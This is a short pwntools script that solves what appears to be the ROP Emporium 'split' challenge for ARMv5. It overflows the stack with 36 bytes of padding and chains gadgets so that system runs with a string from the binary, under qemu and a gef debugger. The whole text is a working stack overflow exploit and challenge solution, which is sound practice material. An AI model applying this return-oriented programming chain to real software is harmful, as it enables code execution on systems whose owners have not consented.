from pwn import *

context.arch = "arm"

elf = ELF("./split_armv5")

gs = f"""
gef-remote --qemu-user --qemu-binary {elf.path} localhost 1234
file {elf.path}
b *pwnme+84
c
"""

io = process(["qemu-arm","-g","1234", elf.path])
gdb.attach(io, gdbscript=gs)


pop_r3_pc = 0x000103a4 # pop {r3, pc}
mov_r0_r3_pop_fp_pc = 0x00010558 # mov r0, r3 ; pop {fp, pc}
bl_system = 0x000105e0

io.sendline(b"A" * 36 + \
        p32(pop_r3_pc) + \
        p32(elf.symbols["usefulString"]) + \
        p32(mov_r0_r3_pop_fp_pc) + \
        p32(0xdeadbeef) + \
        p32(bl_system))

io.interactive()
